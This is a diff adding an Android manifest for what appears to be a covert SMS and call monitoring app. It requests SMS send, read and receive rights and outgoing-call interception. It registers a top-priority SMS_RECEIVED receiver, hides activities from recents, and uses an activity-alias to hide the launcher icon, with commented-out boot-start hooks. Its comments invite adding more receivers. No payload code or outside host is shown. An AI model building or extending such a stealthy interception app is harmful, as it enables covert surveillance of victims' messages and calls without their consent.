@@ -1,0 +1,103 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!-- 
+This manifest can be edited to add more receivers, the reciever scriot is fairly
+universal for handling duffetmrent types of intent actions
+-->
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+	installLocation="internalOnly">
+
+	<uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+	<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+	<uses-permission android:name="android.permission.RECEIVE_SMS" />
+	<uses-permission android:name="android.permission.READ_SMS" />
+
+
+
+	<application
+        android:allowBackup="false"
+        android:theme="@style/AppTheme"
+		android:label="@string/app_name_first">
+
+	    <receiver
+			android:enabled="true"
+			android:name=".receiver"
+			android:exported="true"
+			android:process=":background">
+			<intent-filter>
+				<!--
+				The receiver script will load when these actions occur, add some more and handle them in the
+				receiver activity.
+
+
+				<action android:name="android.intent.action.BOOT_COMPLETED"/>
+				<action android:name="android.intent.action.QUICKBOOT_POWERON"/>
+				<action android:name="com.htc.intent.action.QUICKBOOT_POWERON"/>
+				-->
+				<action android:name="android.intent.action.NEW_OUTGOING_CALL" />
+				<category android:name="android.intent.category.DEFAULT" />
+			</intent-filter>
+		</receiver>
+
+        <receiver android:name=".receiver" android:enabled="true">
+			<intent-filter android:priority="9999">
+				<action android:name="android.provider.Telephony.SMS_RECEIVED" />
+			</intent-filter>
+        </receiver>
+
+		<activity
+			android:name=".home"
+			android:noHistory="true"
+			android:excludeFromRecents="true"
+			android:label="@string/app_name_first">
+			<intent-filter>
+				<category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+		</activity>
+		
+		<activity
+			android:name=".SendSms"
+			android:noHistory="true"
+			android:excludeFromRecents="true"
+			android:theme="@style/hideTheme"
+			android:label="@string/app_name_first">
+			<intent-filter>
+				<category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+		</activity>
+
+		<activity-alias 
+			android:label="@string/app_name_first" 
+			android:name=".home-show"
+			android:noHistory="true"
+			android:excludeFromRecents="true"
+			android:enabled="True"
+			android:targetActivity=".home">
+			<intent-filter>
+				<action android:name="android.intent.action.MAIN" />
+				<category android:name="android.intent.category.LAUNCHER" />
+			</intent-filter>   
+		</activity-alias>
+
+		<activity-alias 
+			android:label="@string/app_name_hidden" 
+			android:name=".home-hide"
+			android:enabled="False"
+			android:noHistory="true"
+			android:excludeFromRecents="true"
+			android:targetActivity=".home">
+			<intent-filter>
+				<action android:name="android.intent.action.MAIN" />
+				<category android:name="android.intent.category.DEFAULT" />
+			</intent-filter>   
+		</activity-alias>
+
+		<activity
+			android:name=".Preferences"
+			android:label="@string/app_name_first">
+		</activity>
+
+    </application>
+
+</manifest>
